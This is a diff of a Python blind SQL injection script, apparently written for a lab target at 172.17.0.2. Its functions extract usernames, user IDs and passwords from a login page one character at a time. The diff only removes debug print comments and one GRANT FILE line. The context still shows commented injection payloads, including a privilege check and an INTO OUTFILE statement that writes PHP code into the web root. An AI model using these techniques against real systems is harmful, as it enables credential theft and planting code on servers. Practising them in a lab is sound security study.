@@ -20,7 +20,6 @@ def get_password(username, url='172.17.0.2'):
             
             if response.url == f"http://{url}/welcome.php":
                 password += char
-                #print(f"found {char} (Now {password})")
                 break
     
     return password
@@ -38,7 +37,6 @@ def get_id(username, url='172.17.0.2'):
             
             if response.url == f"http://{url}/welcome.php":
                 id += char
-                #print(f"found {char} (Now {id})")
                 break
     
     return id
@@ -65,7 +63,6 @@ def enum_users(url='172.17.0.2'):
                 if response.url == f'http://{url}/welcome.php':
                     foundChar = True
                     username += char
-                    #print(f"found {char} (Now {username})")
                     break
             
             if not foundChar:
@@ -109,5 +106,4 @@ if __name__ == '__main__':
 
     #inject_sql("(SELECT IF(COUNT(*) > 0, 'TRUE', 'FALSE') AS Allowed FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE GRANTEE LIKE '%admin%localhost%' AND PRIVILEGE_TYPE = 'CREATE USER')", '127.0.0.1')
     #exec_sql("SELECT '' INTO OUTFILE '/var/www/html/config.php' FIELDS TERMINATED BY '<?php phpinfo();?>'", '127.0.0.1')
-    #exec_sql("GRANT FILE ON *.* TO 'admin'@'localhost';", '127.0.0.1')
     pass
